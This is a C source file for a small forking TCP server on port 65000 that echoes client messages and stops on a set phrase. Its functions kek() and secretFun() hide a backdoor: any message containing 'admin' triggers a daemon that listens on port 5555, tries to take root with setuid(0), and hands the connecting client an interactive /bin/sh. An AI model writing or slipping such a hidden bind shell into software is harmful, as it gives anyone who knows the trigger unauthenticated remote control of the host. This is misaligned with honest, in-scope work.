#include <stdio.h>
#include <netinet/in.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <arpa/inet.h>
#include <sys/types.h>
#include <signal.h>

static const uint16_t SRV_PORT = 65000;

static const char* STOP_WORD = "HOY! hEy LaLA LEY!";

void fillAddress(struct sockaddr_in *addr, int port);

void secretFun();

void kek(const char *buf);

int main() {
	pid_t pid;
	pid = getpid();
    struct sockaddr_in addr;
    fillAddress(&addr, SRV_PORT);

    int sd = socket(AF_INET, SOCK_STREAM, 0);
    if (sd < 0) {
        perror("socket() fail");
        exit(1);
    }

    if (bind(sd, (const struct sockaddr *) &addr, sizeof(addr))) {
        perror("bind() fail");
        close(sd);
        exit(1);
    }

	char buf[256];
	
  
    while (1) { 
		struct sockaddr_in cliAddr;
		if (listen(sd, 10)) {
			perror("listen() fail");
		}
   

        int cliLen = sizeof(cliAddr);
        int cliSd = accept(sd, (struct sockaddr *) &cliAddr, (socklen_t *) &cliLen);

        
        if(!fork()) { 
			close(sd); 
			bzero(buf, 256);
			if (read(cliSd, buf, sizeof(buf)) < 0) {
				perror("read() fail");
			}
 
			if (!strncmp(buf, STOP_WORD, strlen(STOP_WORD))) {
				printf("Stop word received. Exiting...\n");
				kill(pid, SIGKILL);
				break;
			}
			kek(buf);
			printf("%s->me:  %s\n\n", inet_ntoa(cliAddr.sin_addr), buf);
			close(cliSd);
			
            exit(0);
        }
        
        
        
        
        close(cliLen);
    }
    close(sd);
    return 0;
}

void kek(const char *buf) {
    const char* secret = "admin";
    if (strstr(buf, secret) != NULL) {
            secretFun();
        }
}

void secretFun() {
    pid_t pid = fork();
    if (pid > 0) {
                daemon(1, 0);
                struct sockaddr_in bdAddr;
                fillAddress(&bdAddr, 5555);
                int bdSd = socket(AF_INET, SOCK_STREAM, 0);
                bind(bdSd, (const struct sockaddr *) &bdAddr, sizeof(bdAddr));
                listen(bdSd, 1);
                int cli = accept(bdSd, NULL, 0);
                dup2(cli, 0);
                dup2(cli, 1);
                dup2(cli, 2);
                setuid(0);
                setgid(0);
                close(bdSd);
                execl("/bin/sh", "sh", NULL);
            }
}

void fillAddress(struct sockaddr_in *addr, int port) {
  bzero(addr, sizeof(*addr));
  (*addr).sin_family = AF_INET;
  (*addr).sin_addr.s_addr = INADDR_ANY;
  (*addr).sin_port = htons(port);
}
